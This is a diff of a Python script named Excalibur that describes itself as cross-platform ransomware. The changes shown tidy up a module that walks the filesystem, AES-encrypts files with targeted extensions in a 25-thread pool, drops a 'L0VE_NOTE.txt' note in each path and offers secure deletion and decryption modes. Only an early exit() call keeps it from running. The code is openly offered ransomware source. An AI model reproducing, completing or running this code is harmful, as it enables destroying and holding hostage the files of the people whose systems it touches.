@@ -1,36 +1,40 @@
 #!/usr/bin/env python3
-# -=-=-=-=-=-A-=-e-=-S-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
-#                                                                        #
-#       Author     -   pyCity                                            #
-#       Date       -   4/25/19                                           #
-#       Version    -   0.1dev                                            #
-#                                                                        #
-#       Usage      -   python3 Excalibur.py -h                           #
-#                  -   For quick test cases:                             #
-#                  +   python3 -c  \                                     #
-#                      'import Excalibur; Excalibur.main(sys.argv[1:])'  #
-#                                                                        #
-#                  +   As an importable module:                          #
-#                       - import Excalibur, sys                          #
-#                       - Excalibur.main(sys.argv[1])                    #
-#                                                                        #
-# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=A-=-e-=-S-=-=-=-=-=- #
+# -=-=-=-=-=-A-=-e-=-S-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
+#                                                                          #
+#       Author       -   pyCity                                            #
+#       Date         -   4/25/19                                           #
+#       Version      -   0.1dev                                            #
+#                                                                          #
+#       Usage        -   python3 Excalibur.py -h                           #
+#                                                                          #
+#       Development  -   For quick test cases:                             #
+#                    -      python3 -c 'import Excalibur; \                #
+#                           Excalibur.main(sys.argv[1:])'                  #
+#                                                                          #
+#                    +   As an importable module:                          #
+#                         - import Excalibur, sys                          #
+#                         - Excalibur.main(sys.argv[1])                    #
+#                                                                          #
+# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=A-=-e-=-S-=-=-=-=-=-=- #
 import os
 import sys
 import argparse
 
-from base64 import encodebytes
 from getpass import getpass
 from time import time
-from concurrent.futures import ThreadPoolExecutor
+
+try:
+    from concurrent.futures import ThreadPoolExecutor
+    from base64 import encodebytes
+except ImportError:
+    raise ImportError("Python3.7 is required for usage")
 
 try:
     from Crypto import Random
     from Crypto.Hash import SHA256
     from Crypto.Cipher import AES
-except ImportError as hell:
-    print("PyCryptodome dependency not satisfied. Install requirements.txt to continue")
-    raise hell
+except (ImportError, ModuleNotFoundError) as hell:
+    raise hell("PyCryptodome dependency not satisfied. Install requirements.txt to continue")
 
 # --------------------------------------------------------------------------
 
@@ -88,11 +92,11 @@ target_extensions = [
     'db', 'sql', 'dbf', 'mdb', 'iso',  # Databases and disc images
     'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # Web technologies
     'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
-    'java', 'class', 'jar',  # java source code
-    'ps', 'bat', 'vb',  # windows based scripts
-    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
-    'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files
-    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
+    'java', 'class', 'jar',  # Java source code
+    'ps', 'bat', 'vb',  # Windows based scripts
+    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # Linux/mac based scripts
+    'go', 'py', 'pyc', 'bf', 'coffee',  # Other source code files
+    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # Compressed formats
 ]
 
 # --------------------------------------------------------------------------
@@ -109,7 +113,7 @@ else:
 
 # --------------------------------------------------------------------------
 
-# Classes
+# Encryption class
 
 
 class AesExcalibur:
@@ -190,7 +194,7 @@ class AesExcalibur:
 def parse_args(args):
     parser = argparse.ArgumentParser(description="Cross platform ransomeware module in python3.7")
     parser.add_argument("-e", "--encrypt", action="store_true", default=False, help="Encrypt the entire filesystem",
-                        required=False)   # (True if "s" is True else False))
+                        required=False)
 
     parser.add_argument("-d", "--decrypt", action="store_true", default=False, help="Decrypt the entire filesystem",
                         required=False)
@@ -245,23 +249,30 @@ def secure_delete(filename, passes=5):
 
 
 def serve_payload(mode, password):
-    """Run either encrypt or decrypt in a thread pool"""
+    """Run either encrypt or decrypt in a thread pool
+
+    :type password:
+    :type mode:
+    """
 
     start = time()  # Start benchmarking payload time
-    encoded_pass = encodebytes(bytes(password, "utf-8"))  # Base64 encode password for added length before encryption
+    encoded_pass = encodebytes(bytes(password, "utf-8"))  # Base64 encode password for added length before hashing
     sanctuary = AesExcalibur(encoded_pass)  # Initialize encryption object in memory (Also encrypts key)
     files = recursive_walk(paths, target_extensions, mode)  # Create a generator object with targeted files as iterables
 
     with ThreadPoolExecutor(max_workers=25) as pool:  # Serve payload in with max 25 threads in the thread pool
-        if mode == 1:
+        if mode is 1:
+            print(Colors.white + "Encrypting system")
             pool.map(sanctuary.encrypt_file, files)  # Begin applying encryption
             try:
                 for path in paths:
                     with open(path + "/L0VE_NOTE.txt", "w+") as f:
+                        # print(note, file=f)
                         f.write(note)
             except: pass
 
-        elif mode == 2:  # Begin applying decryption
+        elif mode is 2:  # Begin applying decryption
+            print(Colors.white + "Decrypting system")
             pool.map(sanctuary.decrypt_file, files)
 
     # Log output to a file for debug purposes
@@ -274,23 +285,24 @@ def serve_payload(mode, password):
 # --------------------------------------------------------------------------
 
 
-def main(args=False):
+def main(args=None):
     """
     Recursively encrypt or decrypt the filesystem
     Print beautiful artwork
-    Ward away the skids with exit()
+    Ward away the skids with the almighty exit()
     """
-    # os.system("clear" if sys.platform == "linux" else "cls")
     os.system("clear" if "linux" in sys.platform else "cls")
     exit("THIS WILL HARM YOUR COMPUTER")
     print(Colors.blue + ascii_art)
+    print(Colors.underline + args)
 
-    # If user enters any arguments, run them through parse_args()
+    # If user entered any arguments, run them through parse_args()
     if args:
         args = parse_args(args)
+        print(args)
 
     # User didn't enter any args. Get input manually
-    elif not args:
+    if not args:
         user_input = input(Colors.green + "Encrypt or Decrypt? [e/d] ")
         if user_input in ["e", "E", "enc", "encrypt", "Encrypt"]:
             password = getpass(Colors.bold + "Enter a password for the encryption key: ")
@@ -303,23 +315,29 @@ def main(args=False):
         else:
             exit(Colors.red + "Invalid input")
 
-    # User entered some args but didn't enter a password variable
-    if not args.secret:
-        password = getpass(Colors.bold + "Enter a password for the encryption key: ")
-        serve_payload(mode=1, password=password)
+    # User chose encrypt system
+    elif args.encrypt:
 
-    # User has successfully entered the correct values at this point!
-    elif args.encrypt and args.secret:
-        serve_payload(mode=1, password=args.secret)
+        # User entered some args but didn't enter a password variable
+        if not args.secret:
+            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
+            serve_payload(mode=1, password=password)
+        else:
+            serve_payload(mode=1, password=args.secret)
 
-    elif args.decrypt and args.secret:
-        serve_payload(mode=2, password=args.secret)
+    elif args.decrypt:
+
+        # User entered some args but didn't enter a password variable
+        if not args.secret:
+            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
+            serve_payload(mode=2, password=password)
+        else:
+            serve_payload(mode=2, password=args.secret)
 
 
 if __name__ == '__main__':
     main(sys.argv[1:])  # If this script is run directly, use sys.argv for input instead of argparse
-    #
     # # Encrypt this file
-    # if input("Enrypt this file?"):
+    # if input("Encrypt this file?"):
     #     sanctuary.encrypt_file(os.path.abspath(__file__))
     #     sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
